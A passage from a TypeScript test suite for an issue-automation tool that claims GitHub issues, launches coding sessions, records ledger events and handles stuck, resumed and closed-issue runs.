      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: CANNOT_CONFIRM });
      assert.deepStrictEqual(calls, ["issue 7", ...stuckCalls(CANNOT_CONFIRM, null)]);
      // No session was launched, so no T3 call at all.
      assert.deepStrictEqual(t3.calls, []);
      const code = { step: "start", reason: "approval-unconfirmed" };
      assert.deepStrictEqual(entriesOf(dataDir), [
        {
          event: "claimed",
          data: { machine: "mac-mini", github_user: "rawphp" },
          cause: { step: "start", reason: "claimed" },
        },
        {
          event: "state_changed",
          data: { from: "ready", to: "triage" },
          cause: { step: "start", reason: "claimed" },
        },
        { event: "stuck", data: { reason: CANNOT_CONFIRM }, cause: code },
        { event: "state_changed", data: { from: "triage", to: "stuck" }, cause: code },
        {
          event: "finished",
          data: {
            outcome: "stuck",
            total_ms: 0,
            gate_attempts: 0,
            review_cycles: null,
            pr_url: null,
            pr_end: null,
          },
          cause: code,
        },
      ]);
    }),
  );

  it.effect(
    "the new attempt comes after a finished older run, and the older run is left alone",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        olderRun(dataDir, 1, "stuck", true);
        const { tracker } = fakeTracker({ issues: [detail("triage", [USER])] });
        const outcome = yield* startIn(dataDir, tracker);
        assert.deepStrictEqual(outcome, {
          kind: "stuck",
          run: { ...run7, attempt: 2 },
          reason: CANNOT_CONFIRM,
        });
        assert.deepStrictEqual(stepsOf(dataDir), ["claimed", "state_changed", "finished"]);
      }),
  );

  it.effect("with an unfinished run in another state is left to the step that owns it", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      olderRun(dataDir, 1, "building", false, true);
      const { tracker, calls } = fakeTracker({ issues: [detail("triage", [USER])] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(outcome.kind, "skipped");
      assert.deepStrictEqual(calls, ["issue 7"]);
      assert.deepStrictEqual(t3.calls, []);
      assert.deepStrictEqual(stepsOf(dataDir), ["step_changed", "claimed", "state_changed"]);
    }),
  );

  it.effect("with an unfinished run that records no approval, goes stuck in that run", () =>
    Effect.gen(function* () {
      // An earlier stuck path posted the comment, then failed on the label.
      const dataDir = tempDir();
      olderRun(dataDir, 1, "triage");
      const ledger = Ledger.open(dataDir, run7, { clock: () => T0 });
      handles.push(ledger);
      const code = makeCause("start", "approval-unconfirmed");
      ledger.append({ event: "stuck", data: { reason: CANNOT_CONFIRM } }, code);
      const { tracker, calls } = fakeTracker({ issues: [detail("triage", [USER])] });
      const outcome = yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: CANNOT_CONFIRM });
      // The comment is on the issue already, so only the label, release and status follow.
      assert.deepStrictEqual(calls, [
        "issue 7",
        "setState 7 stuck",
        "unassign 7 rawphp",
        `status 7 rawphp ${statusBody("stuck", "mac-mini", null, null)}`,
      ]);
      assert.deepStrictEqual(stepsOf(dataDir), [
        "claimed",
        "state_changed",
        "stuck",
        "state_changed",
        "finished",
      ]);
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, { ...run7, attempt: 2 })), false);
    }),
  );

  it.effect("with an unfinished run in stuck, finishes it and goes stuck in a new attempt", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      olderRun(dataDir, 1, "stuck");
      const { tracker } = fakeTracker({ issues: [detail("triage", [USER])] });
      const outcome = yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(outcome, {
        kind: "stuck",
        run: { ...run7, attempt: 2 },
        reason: CANNOT_CONFIRM,
      });
      const last = readRun(dataDir, run7).entries.at(-1)!;
      assert.strictEqual(last.event, "finished");
      assert.deepStrictEqual(last.cause, { step: "start", reason: "new-attempt-started" });
      assert.strictEqual(
        readRun(dataDir, { ...run7, attempt: 2 }).entries.at(-1)!.event,
        "finished",
      );
    }),
  );
});

describe("start: older runs of the issue", () => {
  it.effect("a new attempt finishes every unfinished older run by its last state first", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const a = olderRun(dataDir, 1, "needs-info");
      const b = olderRun(dataDir, 2, "pr-open");
      const c = olderRun(dataDir, 3, "building");
      olderRun(dataDir, 4, "stuck", true);
      const { tracker } = fakeTracker({});
      const outcome = yield* startIn(dataDir, tracker);
      assert.deepStrictEqual(outcome, {
        kind: "started",
        run: { ...run7, attempt: 5 },
        threadId: "thread-1",
      });
      for (const [id, expected] of [
        [a, "needs-info"],
        [b, "pr-open"],
        [c, "stuck"],
      ] as const) {
        const last = readRun(dataDir, id).entries.at(-1)!;
        assert.strictEqual(last.event, "finished");
        assert.strictEqual((last.data as { outcome: string }).outcome, expected);
        assert.deepStrictEqual(last.cause, {
          step: "start",
          reason: "new-attempt-started",
          actor: "tomkaczocha",
          label: "factory:ready",
        });
      }
    }),
  );

  it.effect("an older run whose gate is running stops the start before anything is written", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const older = olderRun(dataDir, 1, "building");
      const lock = gateLockFile(dataDir, older);
      NodeFS.mkdirSync(NodePath.dirname(lock), { recursive: true });
      NodeFS.writeFileSync(lock, "");
      const { tracker, calls } = fakeTracker({});
      const error = yield* Effect.flip(startIn(dataDir, tracker));
      assert.ok(isGateRunning(error));
      assert.deepStrictEqual(error.run, older);
      assert.deepStrictEqual(calls, ["issue 7", "approval 7 tomkaczocha"]);
      assert.strictEqual(readRun(dataDir, older).entries.at(-1)!.event, "state_changed");
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, { ...run7, attempt: 2 })), false);
    }),
  );
});

const REFUSED = "Thread launch failed during resolve-project.";
const sessionsError = (operation: "archive" | "find-project" | "launch", message: string) =>
  new SessionsError({ operation, cause: new Error(message) });

describe("start: the launch", () => {
  it.effect("a repo with no T3 project goes stuck before any launch is sent", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, { project: null });
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: NO_PROJECT });
      assert.deepStrictEqual(calls, [
        "issue 7",
        "approval 7 tomkaczocha",
        "claim 7 rawphp ready->triage",
        ...stuckCalls(LAUNCH_FAILED, null),
      ]);
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac"]);
      assert.deepStrictEqual(entriesOf(dataDir), [
        ...startedEvents().slice(0, 3),
        ...stuckTail(NO_PROJECT, "launch-failed"),
      ]);
    }),
  );

  // The project is found but names no model, and neither do T3's settings: the same path as no
  // project, so the person reads the fix in the ledger and the issue goes stuck without a launch.
  it.effect("a project with no default model goes stuck before any launch is sent", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, { project: { id: "proj-1", model: null } });
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.strictEqual(
        NO_DEFAULT_MODEL,
        "no default model: set one on the T3 project or in Settings",
      );
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: NO_DEFAULT_MODEL });
      assert.deepStrictEqual(calls.slice(3), stuckCalls(LAUNCH_FAILED, null));
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac"]);
      assert.deepStrictEqual(entriesOf(dataDir), [
        ...startedEvents().slice(0, 3),
        ...stuckTail(NO_DEFAULT_MODEL, "launch-failed"),
      ]);
    }),
  );

  it.effect("a T3 that cannot be reached when the project is looked up claims nothing", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, { project: sessionsError("find-project", "T3 is down") });
      const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
      assert.strictEqual(error._tag, "FactorySessionsError");
      assert.deepStrictEqual(calls, ["issue 7", "approval 7 tomkaczocha"]);
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, run7)), false);
    }),
  );

  it.effect("a launch T3 refuses goes stuck with the detail in the ledger only", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({});
      const t3 = fakeSessions(dataDir, { launches: [sessionsError("launch", REFUSED)] });
      const detailText = sessionMayExistNote(REFUSED, LAUNCH_ID);
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: detailText });
      // The public comment never carries T3's words.
      assert.deepStrictEqual(calls.slice(4), stuckCalls(LAUNCH_FAILED, null));
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac", `launch ${LAUNCH_ID}`]);
      assert.deepStrictEqual(entriesOf(dataDir), [
        ...startedEvents().slice(0, 4),
        ...stuckTail(detailText, "launch-failed"),
      ]);
    }),
  );

  it.effect("a second attempt gets the next number and its own command id", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      olderRun(dataDir, 1, "stuck", true);
      const { tracker } = fakeTracker({});
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      const second = { ...run7, attempt: 2 };
      assert.deepStrictEqual(outcome, { kind: "started", run: second, threadId: "thread-1" });
      assert.deepStrictEqual(t3.calls, [
        "findProject /work/softfac",
        "launch softfac:rawphp__softfac__7__2:launch",
      ]);
      assert.deepStrictEqual(entriesOf(dataDir, second), startedEvents());
      assert.deepStrictEqual(stepsOf(dataDir), ["claimed", "state_changed", "finished"]);
    }),
  );

  it.effect("a text that changed before the second look archives the session and goes stuck", () =>
    Effect.gen(function* () {
      for (const check of ["changed", "unjudged"] as const) {
        const dataDir = tempDir();
        const { tracker, calls } = fakeTracker({ textChecks: [check] });
        const t3 = fakeSessions(dataDir, {});
        const outcome = yield* startIn(dataDir, tracker, t3.sessions);
        assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: TEXT_CHANGED });
        assert.deepStrictEqual(calls, [
          "issue 7",
          "approval 7 tomkaczocha",
          "claim 7 rawphp ready->triage",
          "openPullRequestsClosing 7",
          `textCheck 7 ${LABELED} tomkaczocha`,
          ...stuckCalls(TEXT_CHANGED, "thread-1"),
        ]);
        assert.deepStrictEqual(t3.calls, [
          "findProject /work/softfac",
          `launch ${LAUNCH_ID}`,
          "archive thread-1",
          "thread thread-1",
          `removeWorktree ${WORKTREE}`,
        ]);
        assert.deepStrictEqual(entriesOf(dataDir), [
          ...startedEvents().slice(0, 5),
          {
            event: "worktree_removed",
            data: { path: WORKTREE },
            cause: cause("worktree-removed"),
          },
          ...stuckTail(TEXT_CHANGED, "text-changed-before-start"),
        ]);
      }
    }),
  );

  it.effect(
    "an archive that fails is an error before anything is written, and the next start retries",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        const { tracker, calls } = fakeTracker({
          issues: [detail("ready"), detail("triage", [USER])],
          textChecks: ["changed", "changed"],
        });
        const t3 = fakeSessions(dataDir, {
          archive: [sessionsError("archive", "T3 is busy"), undefined],
        });
        const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
        assert.strictEqual(error._tag, "FactorySessionsError");
        assert.deepStrictEqual(entriesOf(dataDir), startedEvents().slice(0, 5));
        assert.strictEqual(calls.at(-1), `textCheck 7 ${LABELED} tomkaczocha`);
        const outcome = yield* startIn(dataDir, tracker, t3.sessions);
        assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: TEXT_CHANGED });
        assert.strictEqual(t3.calls.filter((c) => c.startsWith("launch ")).length, 1);
        assert.strictEqual(t3.calls.filter((c) => c.startsWith("archive ")).length, 2);
      }),
  );

  it.effect("the second look comes after the launch is recorded and before the label", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const first = fakeTracker({ textChecks: [ghFailure()] });
      const t3 = fakeSessions(dataDir, {});
      const error = yield* Effect.flip(startIn(dataDir, first.tracker, t3.sessions));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents().slice(0, 5));
      assert.strictEqual(first.calls.at(-1), `textCheck 7 ${LABELED} tomkaczocha`);
      // The next start finds the thread in the ledger and does not launch again.
      const second = fakeTracker({ issues: [detail("triage", [USER])] });
      const outcome = yield* startIn(dataDir, second.tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "started", run: run7, threadId: "thread-1" });
      assert.strictEqual(t3.calls.filter((c) => c.startsWith("launch ")).length, 1);
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents());
    }),
  );

  it.effect("a label change that fails after the launch is a runner error with no rollback", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({ setStateFails: true });
      const t3 = fakeSessions(dataDir, {});
      const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents().slice(0, 6));
      assert.strictEqual(calls.length, 6);
      assert.strictEqual(
        t3.calls.some((c) => c.startsWith("archive")),
        false,
      );
    }),
  );

  it.effect("an unassign that fails in the stuck path is a runner error", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({ unassignFails: true });
      const t3 = fakeSessions(dataDir, { project: null });
      const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
      assert.strictEqual(error._tag, "GitHubFailed");
      // The comment and the label went out and are on record; the summary line is not written.
      assert.deepStrictEqual(stepsOf(dataDir), [
        "step_changed",
        "claimed",
        "state_changed",
        "stuck",
      ]);
    }),
  );
});

describe("start: a launch that an earlier pass may have sent", () => {
  it.effect("writes the launch-sending step once and sends under the same command id", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 4));
      const { tracker } = fakeTracker({ issues: [detail("triage", [USER])] });
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents());
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac", `launch ${LAUNCH_ID}`]);
    }),
  );

  it.effect(
    "a launch that cannot be sent after an earlier one may have been says a session may exist",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        seedRun(dataDir, startedLines().slice(0, 4));
        const { tracker, calls } = fakeTracker({ issues: [detail("triage", [USER])] });
        const t3 = fakeSessions(dataDir, { project: null });
        const outcome = yield* startIn(dataDir, tracker, t3.sessions);
        assert.strictEqual(outcome.kind, "stuck");
        const reason = outcome.kind === "stuck" ? outcome.reason : "";
        assert.ok(reason.includes("may have started a session"), reason);
        assert.ok(reason.includes(LAUNCH_ID), reason);
        assert.strictEqual(reason, sessionMayExistNote(NO_PROJECT, LAUNCH_ID));
        assert.strictEqual(calls[1], `comment 7 ${stuckComment(LAUNCH_FAILED)}`);
      }),
  );

  it.effect("a first launch that never went out has no such note", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker } = fakeTracker({});
      const t3 = fakeSessions(dataDir, { project: null });
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: NO_PROJECT });
    }),
  );
});

describe("start: a resume", () => {
  const textCheckCall = `textCheck 7 ${LABELED} tomkaczocha`;
  const triage = () => fakeTracker({ issues: [detail("triage", [USER])] });

  it.effect("with no session launches and then looks at the text once", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 3));
      const { tracker, calls } = triage();
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "started", run: run7, threadId: "thread-1" });
      assert.deepStrictEqual(t3.calls, ["findProject /work/softfac", `launch ${LAUNCH_ID}`]);
      assert.deepStrictEqual(calls, [
        "issue 7",
        "openPullRequestsClosing 7",
        textCheckCall,
        "setState 7 building",
        `status 7 rawphp ${BUILDING}`,
      ]);
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents());
    }),
  );

  it.effect("with a session that was not looked at again does not launch again", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 5));
      const { tracker, calls } = triage();
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(calls, [
        "issue 7",
        textCheckCall,
        "setState 7 building",
        `status 7 rawphp ${BUILDING}`,
      ]);
      assert.deepStrictEqual(t3.calls, []);
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents());
    }),
  );

  it.effect("with a second look that passed does not repeat it", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 6));
      const { tracker, calls } = triage();
      const t3 = fakeSessions(dataDir, {});
      yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(calls, [
        "issue 7",
        "setState 7 building",
        `status 7 rawphp ${BUILDING}`,
      ]);
      assert.deepStrictEqual(t3.calls, []);
    }),
  );

  it.effect("with a session and no recorded approval archives it and goes stuck", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const lines = startedLines();
      seedRun(dataDir, [lines[1]!, lines[2]!, lines[4]!]);
      const { tracker, calls } = triage();
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: CANNOT_CONFIRM });
      assert.deepStrictEqual(calls, ["issue 7", ...stuckCalls(CANNOT_CONFIRM, "thread-1")]);
      assert.deepStrictEqual(t3.calls, [
        "archive thread-1",
        "thread thread-1",
        `removeWorktree ${WORKTREE}`,
      ]);
    }),
  );
});

describe("start: stopping a session that goes stuck", () => {
  it.effect("a worktree that cannot be removed is written down and the run still goes stuck", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const { tracker, calls } = fakeTracker({ textChecks: ["changed"] });
      const t3 = fakeSessions(dataDir, {
        removeWorktree: [
          new SessionsError({ operation: "remove-worktree", cause: new Error("disk busy") }),
        ],
      });
      const outcome = yield* startIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: TEXT_CHANGED });
      assert.deepStrictEqual(calls.slice(5), stuckCalls(TEXT_CHANGED, "thread-1"));
      assert.deepStrictEqual(entriesOf(dataDir), [
        ...startedEvents().slice(0, 5),
        {
          event: "worktree_remove_failed",
          data: { path: WORKTREE, error: "disk busy" },
          cause: cause("worktree-remove-failed"),
        },
        ...stuckTail(TEXT_CHANGED, "text-changed-before-start"),
      ]);
    }),
  );

  it.effect(
    "a removal that cannot archive the threads on the worktree is an error with nothing written, and the next start removes it",
    () =>
      Effect.gen(function* () {
        const dataDir = tempDir();
        const { tracker } = fakeTracker({
          issues: [detail("ready"), detail("triage", [USER])],
          textChecks: ["changed", "changed"],
        });
        const t3 = fakeSessions(dataDir, {
          removeWorktree: [sessionsError("archive", "the projection is locked"), undefined],
        });
        const error = yield* Effect.flip(startIn(dataDir, tracker, t3.sessions));
        assert.strictEqual(error._tag, "FactorySessionsError");
        assert.deepStrictEqual(entriesOf(dataDir), startedEvents().slice(0, 5));
        const outcome = yield* startIn(dataDir, tracker, t3.sessions);
        assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: TEXT_CHANGED });
        assert.strictEqual(t3.calls.filter((c) => c.startsWith("removeWorktree ")).length, 2);
        assert.deepStrictEqual(entriesOf(dataDir).slice(5, 6), [
          { event: "worktree_removed", data: { path: WORKTREE }, cause: cause("worktree-removed") },
        ]);
      }),
  );

  it.effect("a thread T3 no longer knows is stopped at the worktree the ledger records", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 5));
      const { tracker } = fakeTracker({
        issues: [detail("triage", [USER])],
        textChecks: ["changed"],
      });
      const t3 = fakeSessions(dataDir, {
        thread: new ThreadNotFoundError({ threadId: "thread-1" }),
      });
      const outcome = yield* resume(ctxFor(dataDir, tracker, t3.sessions), 7);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: TEXT_CHANGED });
      assert.deepStrictEqual(t3.calls, [
        "archive thread-1",
        "thread thread-1",
        `removeWorktree ${WORKTREE}`,
      ]);
      assert.deepStrictEqual(entriesOf(dataDir).slice(5, 6), [
        { event: "worktree_removed", data: { path: WORKTREE }, cause: cause("worktree-removed") },
      ]);
    }),
  );
});

describe("resume", () => {
  const resumeIn = (dataDir: string, tracker: Tracker, sessions?: Sessions) =>
    resume(ctxFor(dataDir, tracker, sessions ?? fakeSessions(dataDir, {}).sessions), 7);

  it.effect("goes on with a triage run of ours as start does", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 3));
      const { tracker } = fakeTracker({ issues: [detail("triage", [USER])] });
      const outcome = yield* resumeIn(dataDir, tracker);
      assert.deepStrictEqual(outcome, { kind: "started", run: run7, threadId: "thread-1" });
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents());
    }),
  );

  it.effect("never claims an issue put back to ready: that is the claim step's", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 3));
      const { tracker, calls } = fakeTracker({ issues: [detail("ready")] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* resumeIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, {
        kind: "skipped",
        reason: "issue #7 is ready again",
        moved: "ready",
      });
      assert.deepStrictEqual(calls, ["issue 7"]);
      assert.deepStrictEqual(t3.calls, []);
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents().slice(0, 3));
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, { ...run7, attempt: 2 })), false);
    }),
  );

  it.effect("says nothing moved for a ready issue someone is assigned to", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 3));
      const { tracker, calls } = fakeTracker({ issues: [detail("ready", ["bob"])] });
      const outcome = yield* resumeIn(dataDir, tracker);
      // Not `moved: "ready"`: the claim step never takes an assigned issue, so the run stalls.
      assert.deepStrictEqual(outcome, {
        kind: "skipped",
        reason: "issue #7 is already assigned to bob",
      });
      assert.deepStrictEqual(calls, ["issue 7"]);
      assert.deepStrictEqual(entriesOf(dataDir), startedEvents().slice(0, 3));
    }),
  );

  it.effect("ends the unfinished run of a closed issue and writes nothing on GitHub", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      seedRun(dataDir, startedLines().slice(0, 3));
      const { tracker, calls } = fakeTracker({ issues: [detail("triage", [USER], true)] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* resumeIn(dataDir, tracker, t3.sessions);
      // No launch was sent and no thread is named: there is no session to look for.
      assert.deepStrictEqual(outcome, { kind: "abandoned", mayHaveSession: [] });
      assert.deepStrictEqual(calls, ["issue 7", "closedBy 7"]);
      assert.deepStrictEqual(t3.calls, []);
      assert.deepStrictEqual(entriesOf(dataDir), [
        ...startedEvents().slice(0, 3),
        {
          event: "finished",
          data: FINISHED_SEEDED,
          cause: makeCause("start", "issue-closed"),
        },
      ]);
    }),
  );

  it.effect("finishes a stuck path cut short after its label moved", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const first = fakeTracker({ unassignFails: true });
      const t3 = fakeSessions(dataDir, { project: null });
      yield* Effect.flip(startIn(dataDir, first.tracker, t3.sessions));
      // The label is `factory:stuck` and the factory is still assigned.
      const { tracker, calls } = fakeTracker({ issues: [detail("stuck", [USER])] });
      const outcome = yield* resumeIn(dataDir, tracker, t3.sessions);
      assert.deepStrictEqual(outcome, { kind: "stuck", run: run7, reason: NO_PROJECT });
      // The comment went out the first time and is not repeated.
      assert.deepStrictEqual(calls, ["issue 7", ...stuckCalls(LAUNCH_FAILED, null).slice(1)]);
      assert.deepStrictEqual(entriesOf(dataDir), [
        ...startedEvents().slice(0, 3),
        ...stuckTail(NO_PROJECT, "launch-failed").slice(0, 1),
        ...stuckTail(NO_PROJECT, "stuck-resumed").slice(1),
      ]);
    }),
  );

  it.effect("leaves alone a stuck issue whose run never went stuck: a person stopped it", () =>
    Effect.gen(function* () {
      for (const lines of [startedLines().slice(0, 3), startedLines()]) {
        const dataDir = tempDir();
        seedRun(dataDir, lines);
        const before = entriesOf(dataDir);
        const { tracker, calls } = fakeTracker({ issues: [detail("stuck", [USER])] });
        const t3 = fakeSessions(dataDir, {});
        const outcome = yield* resumeIn(dataDir, tracker, t3.sessions);
        assert.strictEqual(outcome.kind, "skipped");
        assert.deepStrictEqual(calls, ["issue 7"]);
        assert.deepStrictEqual(t3.calls, []);
        assert.deepStrictEqual(entriesOf(dataDir), before);
      }
    }),
  );

  it.effect("leaves a stuck issue alone when its run is finished, or it has none", () =>
    Effect.gen(function* () {
      const none = tempDir();
      const noRun = fakeTracker({ issues: [detail("stuck", [USER])] });
      assert.strictEqual((yield* resumeIn(none, noRun.tracker)).kind, "skipped");
      assert.deepStrictEqual(noRun.calls, ["issue 7"]);
      assert.strictEqual(NodeFS.existsSync(runPath(none, run7)), false);

      const finished = tempDir();
      olderRun(finished, 1, "stuck", true);
      const done = fakeTracker({ issues: [detail("stuck", [USER])] });
      assert.strictEqual((yield* resumeIn(finished, done.tracker)).kind, "skipped");
      assert.deepStrictEqual(done.calls, ["issue 7"]);
      assert.strictEqual(NodeFS.existsSync(runPath(finished, { ...run7, attempt: 2 })), false);
    }),
  );
});

/** The summary line of a seeded run, whose first line is a second older than the clock. */
const FINISHED_SEEDED = { ...FINISHED, total_ms: 1000 };

/** A run of issue 7 in state `to`, with the session and pull request it names when asked. */
const sessionRun = (
  dataDir: string,
  attempt: number,
  to: State,
  options: { thread?: string; launchSent?: boolean; pr?: number } = {},
): RunId => {
  const id: RunId = { ...run7, attempt };
  const ledger = Ledger.create(dataDir, id, { clock: () => T0 - 1000 });
  handles.push(ledger);
  const why = makeCause("start", "claimed");
  ledger.append({ event: "step_changed", data: { step: `approved ${LABELED}` } }, why);
  ledger.append({ event: "claimed", data: { machine: "m", github_user: USER } }, why);
  ledger.append({ event: "state_changed", data: { from: "ready", to: "triage" } }, why);
  if (options.launchSent === true || options.thread !== undefined) {
    ledger.append({ event: "step_changed", data: { step: "launch-sending" } }, why);
  }
  if (options.thread !== undefined) {
    ledger.append(
      {
        event: "session_launched",
        data: {
          thread_id: options.thread,
          worktree: WORKTREE,
          branch: "t3code/abc",
          model_instance: "claudeAgent",
          model: "claude-opus-5-5",
          model_options: null,
          resumed_from: null,
        },
      },
      why,
    );
  }
  if (options.pr !== undefined) {
    ledger.append(
      {
        event: "pr_opened",
        data: { pr: options.pr, url: `https://github.com/rawphp/softfac/pull/${options.pr}` },
      },
      why,
    );
  }
  if (to !== "triage") {
    ledger.append({ event: "state_changed", data: { from: "triage", to } }, why);
  }
  return id;
};

const pullOf = (number: number, over: Partial<PullRequest> = {}): PullRequest => ({
  number,
  isDraft: false,
  open: false,
  merged: true,
  headRef: "t3code/abc",
  crossRepository: false,
  baseRef: "main",
  headSha: "abc123",
  mergeable: "mergeable",
  createdAt: "2026-10-04T10:00:00Z",
  ...over,
});

const finishedOf = (dataDir: string, id: RunId) => entriesOf(dataDir, id).at(-1)!;
const isFinished = (dataDir: string, id: RunId) => finishedOf(dataDir, id).event === "finished";

describe("start: a closed issue", () => {
  it.effect("ends every unfinished run of it, oldest first, and writes nothing on GitHub", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const one = sessionRun(dataDir, 1, "needs-info", { thread: "thread-1" });
      const two = sessionRun(dataDir, 2, "triage", { thread: "thread-2" });
      const { tracker, calls } = fakeTracker({
        issues: [detail("ready", [], true)],
        closedBy: "alice",
      });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* start(ctxFor(dataDir, tracker, t3.sessions), 7);
      assert.deepStrictEqual(outcome, { kind: "abandoned", mayHaveSession: [] });
      assert.deepStrictEqual(calls, ["issue 7", "closedBy 7", "closedBy 7"]);
      assert.deepStrictEqual(t3.calls, [
        "archive thread-1",
        "thread thread-1",
        `removeWorktree ${WORKTREE}`,
        "archive thread-2",
        "thread thread-2",
        `removeWorktree ${WORKTREE}`,
      ]);
      const abandoned = makeCause("start", "issue-closed", { actor: "alice" });
      assert.deepStrictEqual(finishedOf(dataDir, one), {
        event: "finished",
        data: { ...FINISHED_SEEDED, outcome: "needs-info" },
        cause: abandoned,
      });
      assert.deepStrictEqual(finishedOf(dataDir, two), {
        event: "finished",
        data: FINISHED_SEEDED,
        cause: abandoned,
      });
      // The worktree line is the second to last line of each run.
      for (const id of [one, two]) {
        assert.strictEqual(entriesOf(dataDir, id).at(-2)!.event, "worktree_removed");
      }
      // Nothing is claimed.
      assert.strictEqual(NodeFS.existsSync(runPath(dataDir, { ...run7, attempt: 3 })), false);
    }),
  );

  it.effect("is the same for resume", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const one = sessionRun(dataDir, 1, "triage", { thread: "thread-1" });
      const { tracker } = fakeTracker({ issues: [detail("triage", [USER], true)] });
      const t3 = fakeSessions(dataDir, {});
      const outcome = yield* resume(ctxFor(dataDir, tracker, t3.sessions), 7);
      assert.deepStrictEqual(outcome, { kind: "abandoned", mayHaveSession: [] });
      assert.deepStrictEqual(finishedOf(dataDir, one).data, FINISHED_SEEDED);
    }),
  );

  it.effect("never ends a run whose gate is running, and then ends none of them", () =>
    Effect.gen(function* () {
      const dataDir = tempDir();
      const one = sessionRun(dataDir, 1, "triage", { thread: "thread-1" });
      const two = sessionRun(dataDir, 2, "building", { thread: "thread-2" });
      const lock = gateLockFile(dataDir, two);
      NodeFS.mkdirSync(NodePath.dirname(lock), { recursive: true });
      NodeFS.writeFileSync(lock, "");
